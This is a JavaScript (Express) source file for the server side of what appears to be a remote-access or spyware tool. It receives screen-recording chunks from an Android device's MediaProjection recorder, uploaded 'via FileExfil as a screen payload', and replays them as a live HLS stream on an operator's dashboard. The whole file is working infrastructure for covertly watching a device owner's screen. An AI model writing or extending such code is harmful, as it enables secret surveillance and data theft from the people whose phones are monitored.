// HLS-style chunked live-stream proxy. The MediaProjection recorder on the
// device uploads small (5-10 second) MP4 chunks via FileExfil as a `screen`
// payload. The server keeps a rolling window of the last N chunks per
// device, and serves them as a flat HLS playlist (M3U8). The dashboard's
// <video> tag plays the playlist as if it were a live HLS stream.
//
// This is *not* true HLS transcoding — we serve the chunks verbatim — but
// hls.js / native HLS players handle the format fine for short loops.

import path from 'node:path'
import fs from 'node:fs'
import { db } from '../lib/firebase.js'

const STREAM_ROOT = path.resolve(process.cwd(), 'var', 'streams')
const MAX_CHUNKS = 12  // ~60-120s of footage at 5-10s per chunk

fs.mkdirSync(STREAM_ROOT, { recursive: true })

function safeId(s) { return String(s).replace(/[^a-zA-Z0-9_-]/g, '').slice(0, 64) }
function deviceDir(deviceId) { const d = path.join(STREAM_ROOT, safeId(deviceId)); fs.mkdirSync(d, { recursive: true }); return d }

export function registerStream(app) {
  // Device posts a chunk here (multipart/form-data: file=<mp4>, duration=<sec>)
  // Auth: any paired device can post to its own device dir.
  app.post('/api/v2/devices/:deviceId/stream/chunk', async (req, res) => {
    const deviceId = safeId(req.params.deviceId)
    if (!deviceId) return res.status(400).json({ error: 'invalid deviceId' })
    const paired = (await db.ref(`devices/${deviceId}/pairedTo`).once('value')).val()
    if (!paired) return res.status(403).json({ error: 'not paired' })
    // The Dashboard already gives the device the SERVER_URL root; we expect
    // raw bytes in req.body as a binary buffer. Express needs express.raw()
    // for this route which is mounted by mount.js below.
    const buf = req.body
    if (!buf || buf.length === 0) return res.status(400).json({ error: 'empty body' })
    const dir = deviceDir(deviceId)
    const ts = Date.now()
    const file = path.join(dir, `${ts}.mp4`)
    fs.writeFileSync(file, buf)
    // Prune older chunks (keep the most recent MAX_CHUNKS)
    const entries = fs.readdirSync(dir).filter((f) => f.endsWith('.mp4')).sort()
    if (entries.length > MAX_CHUNKS) {
      entries.slice(0, entries.length - MAX_CHUNKS).forEach((f) => { try { fs.unlinkSync(path.join(dir, f)) } catch (_) {} })
    }
    // Mirror a tiny pointer for the dashboard
    try {
      await db.ref(`devices/${deviceId}/stream/last`).set({ ts, size: buf.length })
    } catch (_) {}
    res.json({ success: true, ts, bytes: buf.length })
  })

  // Dashboard fetches the live playlist
  app.get('/api/v2/devices/:deviceId/stream/playlist.m3u8', (req, res) => {
    const deviceId = safeId(req.params.deviceId)
    if (!deviceId) return res.status(400).end()
    const dir = deviceDir(deviceId)
    const entries = fs.readdirSync(dir).filter((f) => f.endsWith('.mp4')).sort()
    if (entries.length === 0) {
      res.set('Content-Type', 'application/vnd.apple.mpegurl')
      return res.send('#EXTM3U\n# no chunks yet\n')
    }
    const target = Math.max(3, Math.min(6, entries.length))
    const head = `#EXTM3U\n#EXT-X-VERSION:3\n#EXT-X-TARGETDURATION:${target}\n#EXT-X-PLAYLIST-TYPE:EVENT\n#EXT-X-MEDIA-SEQUENCE:0\n`
    const body = entries.map((f) => ` segments/${f}`).join('\n') + '\n'
    res.set('Content-Type', 'application/vnd.apple.mpegurl')
    res.set('Cache-Control', 'no-store')
    res.send(head + '#EXTINF:' + target + '.0,\n' + body)
  })

  // Dashboard fetches a chunk
  app.get('/api/v2/devices/:deviceId/stream/segments/:name', (req, res) => {
    const deviceId = safeId(req.params.deviceId)
    const name = String(req.params.name || '').replace(/[^a-zA-Z0-9_.-]/g, '')
    if (!deviceId || !name || !name.endsWith('.mp4')) return res.status(400).end()
    const file = path.join(deviceDir(deviceId), name)
    if (!fs.existsSync(file)) return res.status(404).end()
    res.set('Content-Type', 'video/mp4')
    res.set('Cache-Control', 'no-store')
    fs.createReadStream(file).pipe(res)
  })

  // Dashboard pokes to clear the stream (operator action)
  app.delete('/api/v2/devices/:deviceId/stream', (req, res) => {
    const deviceId = safeId(req.params.deviceId)
    if (!deviceId) return res.status(400).json({ error: 'invalid' })
    const dir = deviceDir(deviceId)
    fs.readdirSync(dir).forEach((f) => { try { fs.unlinkSync(path.join(dir, f)) } catch (_) {} })
    res.json({ success: true })
  })
}
